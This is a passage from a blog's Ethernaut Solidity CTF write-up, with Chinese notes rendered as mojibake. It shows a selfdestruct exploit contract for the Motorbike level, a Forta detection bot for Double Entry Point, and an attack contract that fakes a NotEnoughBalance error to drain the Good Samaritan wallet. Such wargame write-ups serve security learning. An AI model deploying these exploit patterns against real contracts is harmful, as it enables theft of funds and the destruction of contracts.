</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">validateItIsBroken</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Check</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">implementation</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exploit</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">initialize</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">selfdestruct</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="26-double-entry-point">26. Double Entry Point</h2>
<p>è‡ªå·±å¯«å€‹ forta bot</p>
<p>éœ€å¯¦ä½œ <code>handleTransaction()</code></p>
<h3 id="exploit-25">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IForta</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">raiseAlert</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">MyDetectionBot</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">handleTransaction</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="n">msgData</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">IForta</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="n">raiseAlert</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¨­å®š bot</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">botAddr</span> <span class="o">=</span> <span class="s1">&#39;0x...&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">forta</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">forta</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">setBotSig</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeFunctionCall</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;setDetectionBot&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;function&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">inputs</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;address&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;detectionBotAddress&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="p">[</span><span class="nx">botAddr</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="nx">from</span><span class="o">:</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">to</span><span class="o">:</span> <span class="nx">forta</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">setBotSig</span> <span class="p">})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="27-good-samaritan">27. Good Samaritan</h2>
<p>æ¸…ç©º wallet çš„ balance</p>
<p>ä¸€ç›´ request é¡¯ç„¶ä¸æ˜¯æ­£è§£</p>
<p><code>tarnsfer()</code> æœƒé€² <code>notify()</code>ï¼Œ<code>dest_</code> å¯ä»¥è‡ªè¡ŒæŒ‡å®šï¼Œå¯èƒ½å¯ä»¥åšä¸€äº›äº‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">dest_</span><span class="p">.</span><span class="n">isContract</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// notify contract 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">INotifyable</span><span class="p">(</span><span class="n">dest_</span><span class="p">).</span><span class="n">notify</span><span class="p">(</span><span class="n">amount_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>line 8 æŠŠéŒ¢å…¨éƒ¨è½‰çµ¦ <code>msg.sender</code>ï¼Œcoolï¼Œé€™å°±æ˜¯æˆ‘å€‘è¦çš„ï¼Œæ–¼æ˜¯åœ¨ notify è£¡é¢å¯«å€‹ err <code>NotEnoughBalance()</code> å°±è¡Œã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">requestDonation</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span> <span class="n">enoughBalance</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// donate 10 coins to requester
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">try</span> <span class="n">wallet</span><span class="p">.</span><span class="n">donate10</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;NotEnoughBalance()&#34;</span><span class="p">))</span> <span class="o">==</span> <span class="nb">keccak256</span><span class="p">(</span><span class="n">err</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// send the coins left
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">wallet</span><span class="p">.</span><span class="n">transferRemainder</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-26">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../levels/GoodSamaritan.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">error</span> <span class="n">NotEnoughBalance</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">GoodSamaritanAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">_goodSamaritan</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">GoodSamaritan</span><span class="p">(</span><span class="n">_goodSamaritan</span><span class="p">).</span><span class="n">requestDonation</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">notify</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount_</span><span class="p">)</span> <span class="k">external</span> <span class="k">pure</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">amount_</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nb">revert</span> <span class="n">NotEnoughBalance</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ethernaut/">ethernaut</a>
        
            <a href="/tags/ctf/">CTF</a>
        
            <a href="/tags/solidity/">Solidity</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/metatrust-ctf-writeup-bytesmove/">
        
        

        <div class="article-details">
            <h2 class="article-title">Metatrust CTF Writeup - BytesMove</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/hats-finance-ctf-2-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">Hats Finance CTF 2 WriteUp</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "ashley-10" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2023 A
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#äº‹å‰æº–å‚™">äº‹å‰æº–å‚™</a></li>
    <li><a href="#0-hello-ethernaut">0. Hello Ethernaut</a></li>
    <li><a href="#1-fallback">1. Fallback</a>
      <ol>
        <li><a href="#exploit">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#2-fallout">2. Fallout</a>
      <ol>
        <li><a href="#exploit-1">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#3-coin-flip">3. Coin Flip</a>
      <ol>
        <li><a href="#exploit-2">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#4-telephone">4. Telephone</a>
      <ol>
        <li><a href="#èˆ‰ä¾‹a-b-c-d">èˆ‰ä¾‹ï¼šA-&gt;B-&gt;C-&gt;D</a>
          <ol>
            <li><a href="#inside-d">Inside D:</a></li>
          </ol>
        </li>
        <li><a href="#exploit-3">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#5-token">5. Token</a>
      <ol>
        <li><a href="#exploit-4">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#6-delegation">6. Delegation</a>
      <ol>
        <li><a href="#exploit-5">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#7-force">7. Force</a>
      <ol>
        <li><a href="#exploit-6">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#8-vault">8. Vault</a>
      <ol>
        <li><a href="#exploit-7">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#9-king">9. King</a>
      <ol>
        <li><a href="#exploit-8">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#10-re-entrancy">10. Re-entrancy</a>
      <ol>
        <li><a href="#exploit-9">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#11-elevator">11. Elevator</a>
      <ol>
        <li><a href="#exploit-10">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#12-privacy">12. Privacy</a>
      <ol>
        <li><a href="#exploit-11">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#13-gatekeeper-one">13. Gatekeeper One</a>
      <ol>
        <li><a href="#gateone">gateOne</a></li>
        <li><a href="#gatetwo">gateTwo</a></li>
        <li><a href="#gatethree">gateThree</a></li>
        <li><a href="#exploit-12">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#14-gatekeeper-two">14. Gatekeeper Two</a>
      <ol>
        <li><a href="#gateone-1">gateOne</a></li>
        <li><a href="#gatetwo-1">gateTwo</a></li>
        <li><a href="#gatethree-1">gateThree</a></li>
        <li><a href="#exploit-13">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#15-naught-coin">15. Naught Coin</a>
      <ol>
        <li><a href="#exploit-14">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#16-preservation">16. Preservation</a>
      <ol>
        <li><a href="#exploit-15">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#17-recovery">17. Recovery</a>
      <ol>
        <li><a href="#exploit-16">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#18-magicnumber">18. MagicNumber</a>
      <ol>
        <li><a href="#runtime-code">Runtime code</a></li>
        <li><a href="#init-code">Init code</a></li>
        <li><a href="#exploit-17">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#19-alien-codex">19. Alien Codex</a>
      <ol>
        <li><a href="#exploit-18">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#20-denial">20. Denial</a>
      <ol>
        <li><a href="#exploit-19">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#21-shop">21. Shop</a>
      <ol>
        <li><a href="#exploit-20">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#22-dex">22. DEX</a>
      <ol>
        <li><a href="#exploit-21">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#23-dex-two">23. Dex Two</a>
      <ol>
        <li><a href="#exploit-22">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#24-puzzle-wallet">24. Puzzle Wallet</a>
      <ol>
        <li><a href="#exploit-23">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#25-motorbike">25. Motorbike</a>
      <ol>
        <li><a href="#eip-1967">EIP-1967</a></li>
        <li><a href="#exploit-24">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#26-double-entry-point">26. Double Entry Point</a>
      <ol>
        <li><a href="#exploit-25">Exploit</a></li>
      </ol>
    </li>
    <li><a href="#27-good-samaritan">27. Good Samaritan</a>
      <ol>
        <li><a href="#exploit-26">Exploit</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
